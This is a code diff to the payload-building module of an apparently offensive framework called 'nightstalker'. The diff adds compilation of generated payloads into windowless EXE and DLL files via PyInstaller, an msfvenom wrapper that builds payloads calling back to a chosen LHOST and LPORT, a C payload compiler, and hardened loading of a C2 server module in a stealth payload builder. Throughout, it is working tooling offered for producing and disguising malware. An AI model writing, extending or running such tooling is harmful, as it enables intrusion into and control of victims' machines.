@@ -29,6 +29,8 @@ import re
 import socket
 import platform
 
+from nightstalker.utils.tool_manager import ToolManager
+
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -50,7 +52,15 @@ class PayloadBuilder:
         self.payloads = self._load_payloads()
         self.encryption_key = None
         self._setup_encryption()
+        # Initialize required tools
+        self._init_tools()
 
+    def _init_tools(self):
+        """Initialize and check required external tools"""
+        required_tools = ['pyinstaller', 'cx_Freeze', 'gcc', 'mingw32-gcc', 'msfvenom']
+        logger.info("Checking required tools for Payload Builder...")
+        ToolManager.check_and_install_tools(required_tools, logger)
+    
     def _get_default_config(self) -> Dict[str, Any]:
         """Get default payload configuration"""
         return {
@@ -236,19 +246,219 @@ class PayloadBuilder:
             # Ensure output directory exists
             os.makedirs(os.path.dirname(output_path), exist_ok=True)
             
-            # Write payload file
-            with open(output_path, 'w', encoding='utf-8') as f:
-                f.write(code)
-            
-            # Make executable for bash scripts
-            if output_format == "bash":
-                os.chmod(output_path, 0o755)
+            # Handle different output formats
+            if output_format in ['exe', 'dll']:
+                output_path = self._build_executable(code, output_format, output_path, payload_type)
+            else:
+                # Write payload file
+                with open(output_path, 'w', encoding='utf-8') as f:
+                    f.write(code)
+                
+                # Make executable for bash scripts
+                if output_format == "bash":
+                    os.chmod(output_path, 0o755)
             
             logger.info(f"Payload built successfully: {output_path}")
             return output_path
             
         except Exception as e:
             logger.error(f"Failed to build payload: {e}")
+            raise
+
+    def _build_executable(self, code: str, output_format: str, output_path: str, payload_type: str) -> str:
+        """Build executable from Python code"""
+        try:
+            # Create temporary directory for build
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                
+                # Write Python source file
+                source_file = temp_path / f"{payload_type}.py"
+                with open(source_file, 'w', encoding='utf-8') as f:
+                    f.write(code)
+                
+                if output_format == "exe":
+                    return self._build_exe_with_pyinstaller(source_file, output_path)
+                elif output_format == "dll":
+                    return self._build_dll_with_pyinstaller(source_file, output_path)
+                else:
+                    raise ValueError(f"Unsupported executable format: {output_format}")
+                    
+        except Exception as e:
+            logger.error(f"Failed to build executable: {e}")
+            raise
+
+    def _build_exe_with_pyinstaller(self, source_file: Path, output_path: str) -> str:
+        """Build EXE using PyInstaller"""
+        try:
+            if not ToolManager.is_tool_installed('pyinstaller'):
+                raise RuntimeError("PyInstaller not installed")
+            
+            cmd = [
+                'pyinstaller',
+                '--onefile',
+                '--noconsole',
+                '--distpath', os.path.dirname(output_path),
+                '--name', os.path.splitext(os.path.basename(output_path))[0],
+                str(source_file)
+            ]
+            
+            logger.info(f"Building EXE with PyInstaller: {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+            
+            if result.returncode != 0:
+                logger.error(f"PyInstaller failed: {result.stderr}")
+                raise RuntimeError(f"PyInstaller build failed: {result.stderr}")
+            
+            # PyInstaller creates the file in dist/ directory
+            dist_file = Path("dist") / os.path.basename(output_path)
+            if dist_file.exists():
+                shutil.move(str(dist_file), output_path)
+                # Clean up PyInstaller artifacts
+                if Path("build").exists():
+                    shutil.rmtree("build")
+                if Path("dist").exists():
+                    shutil.rmtree("dist")
+                if Path(f"{source_file.stem}.spec").exists():
+                    os.remove(f"{source_file.stem}.spec")
+            
+            return output_path
+            
+        except subprocess.TimeoutExpired:
+            raise RuntimeError("PyInstaller build timed out")
+        except Exception as e:
+            logger.error(f"PyInstaller build failed: {e}")
+            raise
+
+    def _build_dll_with_pyinstaller(self, source_file: Path, output_path: str) -> str:
+        """Build DLL using PyInstaller (as a library)"""
+        try:
+            if not ToolManager.is_tool_installed('pyinstaller'):
+                raise RuntimeError("PyInstaller not installed")
+            
+            cmd = [
+                'pyinstaller',
+                '--onefile',
+                '--noconsole',
+                '--library',
+                '--distpath', os.path.dirname(output_path),
+                '--name', os.path.splitext(os.path.basename(output_path))[0],
+                str(source_file)
+            ]
+            
+            logger.info(f"Building DLL with PyInstaller: {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+            
+            if result.returncode != 0:
+                logger.error(f"PyInstaller DLL build failed: {result.stderr}")
+                raise RuntimeError(f"PyInstaller DLL build failed: {result.stderr}")
+            
+            # PyInstaller creates the file in dist/ directory
+            dist_file = Path("dist") / os.path.basename(output_path)
+            if dist_file.exists():
+                shutil.move(str(dist_file), output_path)
+                # Clean up PyInstaller artifacts
+                if Path("build").exists():
+                    shutil.rmtree("build")
+                if Path("dist").exists():
+                    shutil.rmtree("dist")
+                if Path(f"{source_file.stem}.spec").exists():
+                    os.remove(f"{source_file.stem}.spec")
+            
+            return output_path
+            
+        except subprocess.TimeoutExpired:
+            raise RuntimeError("PyInstaller DLL build timed out")
+        except Exception as e:
+            logger.error(f"PyInstaller DLL build failed: {e}")
+            raise
+
+    def build_msfvenom_payload(self, payload_type: str, lhost: str, lport: int, output_format: str = "exe") -> str:
+        """Build payload using MSFvenom"""
+        try:
+            if not ToolManager.is_tool_installed('msfvenom'):
+                raise RuntimeError("MSFvenom not installed")
+            
+            # Determine output path
+            timestamp = str(int(time.time()))
+            filename = f"msfvenom_{payload_type}_{timestamp}.{output_format}"
+            output_path = os.path.join("output", "payloads", filename)
+            os.makedirs(os.path.dirname(output_path), exist_ok=True)
+            
+            # Build MSFvenom command
+            cmd = [
+                'msfvenom',
+                '-p', payload_type,
+                f'LHOST={lhost}',
+                f'LPORT={lport}',
+                '-f', output_format,
+                '-o', output_path
+            ]
+            
+            logger.info(f"Building MSFvenom payload: {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+            
+            if result.returncode != 0:
+                logger.error(f"MSFvenom failed: {result.stderr}")
+                raise RuntimeError(f"MSFvenom build failed: {result.stderr}")
+            
+            logger.info(f"MSFvenom payload built: {output_path}")
+            return output_path
+            
+        except subprocess.TimeoutExpired:
+            raise RuntimeError("MSFvenom build timed out")
+        except Exception as e:
+            logger.error(f"MSFvenom build failed: {e}")
+            raise
+
+    def build_c_payload(self, source_code: str, output_format: str = "exe") -> str:
+        """Build C/C++ payload"""
+        try:
+            # Determine compiler based on platform
+            if platform.system() == "Windows":
+                if ToolManager.is_tool_installed('mingw32-gcc'):
+                    compiler = 'mingw32-gcc'
+                elif ToolManager.is_tool_installed('gcc'):
+                    compiler = 'gcc'
+                else:
+                    raise RuntimeError("No C compiler found (gcc or mingw32-gcc)")
+            else:
+                if not ToolManager.is_tool_installed('gcc'):
+                    raise RuntimeError("GCC not installed")
+                compiler = 'gcc'
+            
+            # Create temporary directory for build
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                
+                # Write C source file
+                source_file = temp_path / "payload.c"
+                with open(source_file, 'w', encoding='utf-8') as f:
+                    f.write(source_code)
+                
+                # Determine output path
+                timestamp = str(int(time.time()))
+                filename = f"c_payload_{timestamp}.{output_format}"
+                output_path = os.path.join("output", "payloads", filename)
+                os.makedirs(os.path.dirname(output_path), exist_ok=True)
+                
+                # Build command
+                cmd = [compiler, '-o', output_path, str(source_file)]
+                
+                logger.info(f"Building C payload: {' '.join(cmd)}")
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                
+                if result.returncode != 0:
+                    logger.error(f"C compilation failed: {result.stderr}")
+                    raise RuntimeError(f"C compilation failed: {result.stderr}")
+                
+                logger.info(f"C payload built: {output_path}")
+                return output_path
+                
+        except subprocess.TimeoutExpired:
+            raise RuntimeError("C compilation timed out")
+        except Exception as e:
+            logger.error(f"C payload build failed: {e}")
             raise
 
     def list_formats(self) -> List[str]:
@@ -436,7 +646,11 @@ class StealthPayloadBuilder:
             c2_server_path = self.payloads_dir / "c2_server.py"
             if c2_server_path.exists():
                 spec = importlib.util.spec_from_file_location("c2_server", c2_server_path)
+                if spec is None:
+                    raise ImportError("Failed to create module spec for C2 server")
                 c2_server_module = importlib.util.module_from_spec(spec)
+                if spec.loader is None:
+                    raise ImportError("Failed to get loader for C2 server module")
                 spec.loader.exec_module(c2_server_module)
                 C2Server = c2_server_module.C2Server
             else:
